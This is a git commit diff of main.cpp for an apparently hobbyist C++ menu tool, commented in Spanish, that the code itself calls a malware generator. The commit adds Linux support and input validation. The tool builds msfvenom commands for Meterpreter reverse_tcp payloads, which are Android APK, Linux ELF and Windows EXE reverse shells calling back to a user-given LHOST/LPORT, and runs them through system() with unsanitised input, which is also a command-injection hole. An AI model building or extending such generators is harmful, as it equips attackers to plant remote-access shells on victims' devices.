b6c7cbbda5678f7264c4738699378ff968219999
74lg0 <111157836+74lg0@users.noreply.github.com>
2025-06-29 19:50:22 -0600

    Update main.cpp

--- main/main.cpp
+++ main/main.cpp
@@ -22,58 +22,109 @@ XD
 // Librerias
 #include <iostream>
 #include <unistd.h>
+#include <string>
+#include <sstream>
 #include "colors.h"
 
 //Namespace
 using namespace std;
 using namespace Color;
 
+// Validar que no de una entrada vacía o string
+int obtenerOpcion() {
+    string input;
+    cout << paint_multi("\nSelect Op => ", RED, ITALIC);
+    getline(cin, input); // Leer toda la línea
+
+    if (input.empty()) {
+        cout << paint_multi("Option cannot be empty\n", RED, ITALIC);
+        return -1;
+    }
+
+    stringstream ss(input);
+    int opcion;
+    if (!(ss >> opcion)) {
+        cout << paint_multi("Invalid input. Must be a number.\n", RED, ITALIC);
+        return -1;
+    }
+
+    return opcion;
+}
+
 // Generadores de Malware para Android/Linux/Windows
+
+// Generador de Malware para Android mediante MetaSploit
 void android_meta(string lhost, string lport){
-    // Generating malware with MetaSploit
+    // Genera el payload MsfVenom para Android
+    // y lo guarda en un archivo APK
     string payload = "msfvenom -p android/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f apk -o android_shell.apk";
+    // Ejecuta el comando en la terminal usando c_str() para manejo de cons char*
     system(payload.c_str());
 }
 
-
-string linux_meta(){
-    string l = "Linux";
-    return l;
-}
-
-void windows_meta(string lhost, string lport, int version){
-    // Generating malware with MetaSploit
-    // Windows Version
-
+// Genera el malware para Linux mediante MetaSploit
+void linux_meta(string lhost, string lport, int version){
+    // Genera el payload MsfVenom para Linux
+    // y lo guarda en un archivo ELF
+    // version 1: linux/x86/meterpreter/reverse_tcp
+    // version 2: linux/x64/meterpreter/reverse_tcp
+    string payload;
     if (version == 1){
-        string payload = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f exe -o windows_shell.exe";
-        system(payload.c_str());
+        // Genera el payload para Linux x86
+        // y lo guarda en un archivo ELF llamado linux_x86shell.elf
+        payload = "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f elf -o linux_x86shell.elf";
+    }
+    else if (version == 2){
+        // Genera el payload para Linux x64
+        // y lo guarda en un archivo ELF llamado linux_x64shell.elf
+        payload = "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f elf -o linux_x64shell.elf";
+    }
+    // Ejecuta el comando en la terminal usando c_str() para manejo de cons char*
+    system(payload.c_str());
+}
+
+// Genera el malware para Windows mediante MetaSploit
+void windows_meta(string lhost, string lport, int version){
+    // Genera el payload MsfVenom para Windows
+    // Version 1: windows/meterpreter/reverse_tcp
+    // Version 2: windows/x64/meterpreter/reverse_tcp
+    // Para arquitectura de 32 bits y 64 bits respectivamente
+    if (version == 1){
+        // Genera el payload para Windows x86
+        // y lo guarda en un archivo EXE llamado windows_x86shell.exe
+        string payload = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f exe -o windows_x86shell.exe";
+        system(payload.c_str()); // Ejecuta el comando en la terminal usando c_str() para manejo de cons char*
     }
 
-    if (version == 2){
-        string payload = "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f exe -o windows_shell.exe";
-        system(payload.c_str());
+    else if (version == 2){
+        // Genera el payload para Windows x64
+        // y lo guarda en un archivo EXE llamado windows_x64shell.exe
+        string payload = "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f exe -o windows_x64shell.exe";
+        system(payload.c_str()); // Ejecuta el comando en la terminal usando c_str() para manejo de cons char*
     }
 }
 
-string android_origin(){
-    string a = "Android File";
-    return a;
+// Estas funciones retornan strings de marcador de posición para Android, Linux y Windows.
+// Actualmente, el código fuente específico para cada plataforma aún no está implementado.
+// Al definir estas funciones ahora, facilitamos futuras implementaciones sin necesidad de cambiar el menú.
+void android_origin(){
+    cout << paint_multi("Android malware generator is not implemented yet.", RED, ITALIC) << endl;
 }
 
-string linux_origin(){
-    string l = "Linux";
-    return l;
+void linux_origin(){
+    cout << paint_multi("Linux malware generator is not implemented yet.", RED, ITALIC) << endl;
 }
 
-string windows_origin(){
-    string w = "Windows";
-    return w;
+void windows_origin(){
+    cout << paint_multi("Windows malware generator is not implemented yet.", RED, ITALIC) << endl;
 }
 
 
-// Banner del programa
+// Banner del programa con ASCII art
+// Muestra a mi encantadora Lain, mi persnaje favorito de anime
+// y la version del programa
 void start_banner(){
+    system("clear");
     string banner = R"(
 ⠀⡄⢉⠲⢿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡔⣧⡽⠋⠀⣰⣶⣻⣶⣿⢾⣷
 ⢤⡈⠉⠲⢤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⢀⡴⢏⡳⢮⡿⣽⣞⠻⡜
@@ -107,16 +158,13 @@ void start_banner(){
                         Version 1.0
 
 )";
-    system("clear");
-    cout<<paint_multi(banner, CYAN);
+    cout<<paint_multi(banner, CYAN) << endl;
     sleep(2);
     system("clear");
 }
 
 // Menu
 void menu(){
-    system("clear");
-
     // ASCII art para el banner
     string menu = R"(
                               (
@@ -138,40 +186,86 @@ void menu(){
  |   [3] Windows       |  |   [6] Windows File   |
  |_____________________|  |______________________|
 
+                    [0] Exit
+
     )";
     cout<<paint(menu, CYAN);
-    int opciones;
-    cout<<"\n";
-    cout<<paint("Select Op => ", BRIGHT_RED);
-    cin>>opciones;
+    // Creditos a esta validacion a GPT
+    int opciones = obtenerOpcion();
+    if (opciones == -1) {
+        // Manejar error
+        return;
+    }
+
+    // Si lo anterior no se cumple, ejecutar el switch
     switch (opciones){
+        case 0:
+            cout<<paint("[!] Saliendo del programa...", BRIGHT_RED)<<endl;
+            // Esperar 1 segundo antes de salir
+            sleep(1);
+            exit(0);
+            break;
+
+        // Android Malware MetaSploit Generator
         case 1: {
+            // Configuracion de variables
             string lport, lhost;
             
             // Configuracion del host:port
             cout<<paint_multi("LHOST= ", GREEN, ITALIC);
-            cin>>lhost;
+            cin>>lhost; // Pedir LHOST
             cout<<paint_multi("LPORT= ", GREEN, ITALIC);
-            cin>>lport;
-
+            cin>>lport; // Pedir LPORT
+            // Validar LHOST y LPORT
+            if (lhost.empty() || lport.empty()) {
+                cout << paint_multi("LHOST and LPORT cannot be empty", RED, ITALIC) << endl;
+                break;
+            }
             // Android Malware MetaSploit
             android_meta(lhost, lport);
             break;
         }
 
         case 2: {
-            // Linx Malware MetaSploit
-            linux_meta();
+            string lhost, lport;
+            int linux_version;
+            string linux_menu = R"(
+        [1] [1] Linux x86 (32 bits)
+        [2] Linux x64 (64 bits)
+            )";
+            cout << paint_multi(linux_menu, GREEN, ITALIC);
+            cout << endl << paint_multi("Select Linux Version => ", GREEN, ITALIC);
+            cin >> linux_version;
+            // Validar la opción primero
+            if (linux_version != 1 && linux_version != 2) {
+                cout << paint_multi("Incorrect option", RED, ITALIC) << endl;
+                break;
+            }
+            // Solo si es opción válida, pedimos LHOST y LPORT
+            cout << paint_multi("LHOST= ", GREEN, ITALIC);
+            cin >> lhost;
+            cout << paint_multi("LPORT= ", GREEN, ITALIC);
+            cin >> lport;
+            // Validar LHOST y LPORT
+            if (lhost.empty() || lport.empty()) {
+                cout << paint_multi("LHOST and LPORT cannot be empty", RED, ITALIC) << endl;
+                break;
+            }
+
+            // Linux Malware MetaSploit
+            linux_meta(lhost, lport, linux_version);
             break;
+            
         }
 
         case 3: {
             int win_version;
             string window = R"(
-        [1] Windows x32 bits
-        [2] Windows x64_82 bits
+            [1] Windows x86 (32 bits)
+            [2] Windows x64 (64 bits)
             )";
-
+            // Mostrar el menú de versiones de Windows
+            
             cout << paint_multi(window, GREEN, ITALIC);
             cout << endl << paint_multi("Select Win Version => ", GREEN, ITALIC);
             cin >> win_version;
@@ -181,7 +275,7 @@ void menu(){
                 cout << paint_multi("Incorrect option", RED, ITALIC) << endl;
                 break;
             }
-
+            // Configuracion del host:port
             // Solo si es opción válida, pedimos LHOST y LPORT
             string lhost, lport;
             cout << paint_multi("LHOST= ", GREEN, ITALIC);
@@ -189,9 +283,14 @@ void menu(){
             cout << paint_multi("LPORT= ", GREEN, ITALIC);
             cin >> lport;
 
+            // Validar LHOST y LPORT
+            if (lhost.empty() || lport.empty()) {
+                cout << paint_multi("LHOST and LPORT cannot be empty", RED, ITALIC) << endl;
+                break;
+            }
+
             // Llamar función según la opción
             windows_meta(lhost, lport, win_version);
-
             break;
         }
 
